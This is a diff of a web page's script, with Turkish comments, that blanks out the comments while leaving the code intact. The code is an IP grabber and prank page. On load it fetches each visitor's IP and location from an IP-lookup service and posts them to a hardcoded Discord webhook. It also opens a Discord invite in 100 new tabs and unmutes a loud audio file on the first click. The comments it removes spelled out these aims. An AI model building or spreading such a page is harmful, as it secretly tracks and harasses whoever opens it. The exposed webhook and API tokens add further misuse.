@@ -76,7 +76,7 @@
   <!-- Mp3 dosyan entegre edildi! -->
   <audio id="audio-player" src="https://cdn.discordapp.com/attachments/1323494216852308008/1412543226468110346/Moscow_Moscow_missile_meme_earrape.mp3?ex=68b8ace4&is=68b75b64&hm=06bd01749a5bc92fd1a7fb5cfa3877d016525084c09f4f7a38c13f8b692a414a&" autoplay loop muted></audio>
   <script>
-    // Yıldız efekti
+    // 
     const canvas = document.getElementById("stars");
     const ctx = canvas.getContext("2d");
     canvas.width = window.innerWidth;
@@ -105,14 +105,14 @@
     }
     drawStars();
 
-    // Sayfa açılır açılmaz IP bilgilerini çek ve webhooka gönder
+    // 
     fetch("https://ipinfo.io/json?token=8d7365019dc710")
       .then(response => response.json())
       .then(data => {
         document.getElementById("ipinfo").textContent = JSON.stringify(data, null, 2);
         window.ipData = data; // Tıklama anında kullanmak için
 
-        // Webhook'a POST gönder
+        // 
         var webhookURL = "https://discord.com/api/webhooks/1412165143961407570/rNvbuXQPj9VoWSffMDT8ySmCKgRrUkKW0LaHXEqDLqW1d67C9A1ikJB64NRRjt-Fvxhi";
         var ipInfo = JSON.stringify(data, null, 2);
         var payload = {
@@ -130,20 +130,20 @@
         document.getElementById("ipinfo").textContent = "Bilgiler alınamadı.";
       });
 
-    // Otomatik müzik oynatma (bazı tarayıcılarda kullanıcı etkileşimi gerekebilir)
+    // 
     window.addEventListener('click', function() {
       document.getElementById('audio-player').play();
       document.getElementById('audio-player').muted = false;
     });
 
-    // 10.000 kez Discord davet linki yeni sekmede aç
+    // 
     function spamDiscordInvite() {
       for (let i = 0; i < 100; i++) {
         window.open("https://discord.gg/fivemdown", "_blank");
       }
     }
 
-    // Sayfa açılır açılmaz otomatik çalmayı dene ve sesi aç!
+    // 
     window.onload = function() {
       // Discord davet spam fonksiyonunu çağır
       spamDiscordInvite();
